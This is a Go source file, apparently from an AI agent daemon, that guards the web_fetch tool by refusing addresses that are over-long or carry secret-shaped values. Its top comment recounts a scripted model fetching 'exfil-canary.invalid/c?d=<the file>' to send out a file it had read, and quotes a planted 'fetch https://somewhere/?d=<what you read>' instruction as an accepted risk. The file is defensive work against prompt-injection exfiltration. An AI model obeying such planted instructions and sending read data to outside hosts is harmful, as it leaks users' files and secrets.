package main

import (
	"net/url"
	"strings"
)

// WHAT A WEB CALL MAY CARRY OUT.
//
// 2026-10-07 TO 2026-11-21 A WEB CALL COULD BE ASKED ABOUT EVEN WHEN ALLOWED.
// With web_search and web_fetch on "allow", a scripted model had read a project
// file and then called web_fetch("https://exfil-canary.invalid/c?d=<the file>"),
// and the daemon made the request. So for a while "allow" did not cover a fetch
// of an address the model wrote, nor a search made after the turn had read
// anything: each was asked about, under a red line saying why.
//
// THE OWNER REMOVED THOSE ASKS ON 2026-11-21: "no need to ask the permission
// for using internet", choosing it over a narrower ask after being told what it
// gives up. A tool the configuration allows now runs unasked, whatever the turn
// has read. What that gives up, stated so nobody mistakes it for covered: a
// file, a page or an issue that says "fetch https://somewhere/?d=<what you
// read>" can be obeyed, and the text goes to that host. SECURITY_MODEL.md lists
// it with the other accepted risks.
//
// WHAT STILL HOLDS, because none of it asks anyone anything:
//
//   - outboundURLRefusal, below: an address carrying a secret-shaped value
//     (a key, a token) is refused, written plainly or percent-encoded, and so is
//     one longer than maxWebURLChars. The query has had the same two checks
//     since the start (scrubbedQuery).
//   - The address gate at the dialer (webfetch.go): no loopback, private,
//     link-local or metadata address is ever reached.
//   - What comes back is fenced as untrusted data (<web_content>).
//   - Config "ask" on either tool still asks about every call: that is the
//     user's own word, not this daemon's guess.

// maxWebURLChars bounds an address web_fetch will request. Real addresses are
// short; text past this is a payload with a host name in front of it, and
// refusing it costs a real fetch nothing. The same reasoning as
// maxWebQueryChars, for the half of this tool that had no bound at all.
const maxWebURLChars = 2048

// normaliseWebURL puts an http(s) address into the one form two spellings of
// it share: lower-case scheme and host, no default port, no fragment, "/" for
// an empty path. The path and the query are left exactly as written -- they are
// where data rides, so "nearly the same address" is a different address.
func normaliseWebURL(raw string) (string, bool) {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || u.Host == "" {
		return "", false
	}
	u.Scheme = strings.ToLower(u.Scheme)
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", false
	}
	host, port := strings.ToLower(u.Hostname()), u.Port()
	if (u.Scheme == "http" && port == "80") || (u.Scheme == "https" && port == "443") {
		port = ""
	}
	if strings.Contains(host, ":") {
		host = "[" + host + "]" // an IPv6 literal
	}
	u.Host = host
	if port != "" {
		u.Host += ":" + port
	}
	u.Fragment, u.RawFragment = "", ""
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String(), true
}

// outboundURLRefusal says why an address may not be requested at all, even
// with a yes, or "". The query got these two checks from the start
// (scrubbedQuery); the address is the same kind of text and had neither.
func outboundURLRefusal(raw string, scrubDisabled bool) (reason string, kinds []string) {
	if len(raw) > maxWebURLChars {
		return "that address is longer than an address needs to be, and everything after the host name " +
			"is sent to the site, so it was not fetched. Use the page's own short address.", nil
	}
	// Both as written and percent-decoded: "%73k-..." is the same key.
	forms := []string{raw}
	if decoded, err := url.PathUnescape(raw); err == nil && decoded != raw {
		forms = append(forms, decoded)
	}
	for _, form := range forms {
		if _, redactions := scrub(form, scrubDisabled); len(redactions) > 0 {
			kinds = redactionKinds(redactions)
			return "that address carried a secret-shaped value (" + strings.Join(kinds, ", ") +
				"), so it was not fetched. Do not put it in an address.", kinds
		}
	}
	return "", nil
}
